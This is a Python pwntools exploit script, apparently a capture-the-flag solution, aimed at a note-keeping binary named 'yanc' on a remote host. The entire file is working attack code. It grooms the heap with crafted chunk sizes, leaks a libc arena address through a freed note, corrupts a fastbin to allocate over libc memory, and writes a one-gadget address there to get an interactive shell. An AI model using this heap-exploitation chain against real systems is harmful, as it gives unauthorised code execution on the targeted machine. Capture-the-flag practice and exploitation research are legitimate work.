from pwn import *

def add(name, title):
	r.recvuntil('quit\n')
	r.sendline('1')
	r.recvuntil('Enter note : ')
	r.sendline(name);
	r.recvuntil('Enter title : ')
	r.send(title)

def delete(index):
	r.recvuntil('quit\n')
	r.sendline('2')
	r.recvuntil('Which one : ')
	r.sendline(str(index))
	
def view():
	r.recvuntil('quit\n')
	r.sendline('3')

#r = process('./yanc')
r = remote('10.13.37.73', 1234)
raw_input('?')

add('a'*0x80, 'x\n') #0
payload = '\x00'*0x48
payload += p64(0x71)
payload += '\x00'*0x30
add(payload, 'x\n') #1
payload = '\x00'*0x28
payload += p64(0x80)
payload += '\x00'*0x30
add(payload, 'x\n') #2
delete(0)
add('a'*0xa0, '\x10'*0x21) #0
delete(0)
view()
r.recvuntil('Note : ')
tmp = r.recv(6)+'\x00'*2
arena = u64(tmp)-216
leak = arena-27-8
onegadget = arena-0x2d39d9
log.info('arena: %#x' %arena)
log.info('leak: %#x' %leak)
log.info('onegadget: %#x' %onegadget)
add('a'*0xa0, '\xf0'*0x21) #0
delete(2)
delete(1)
payload = '\x00'*0x38
payload += p64(0x71)
payload += p64(leak)
payload += p64(0)*3
add(payload, 'a\n')
payload = "a"*0x60
add(payload, 'a\n')
payload = "\x00"*3+p64(onegadget)+"\x00"*5
payload += "\x00"*0x50
add(payload, 'a\n')
r.recvuntil('quit\n')
r.sendline('1')
r.recvuntil('Enter note : ')
r.sendline("a");
r.interactive()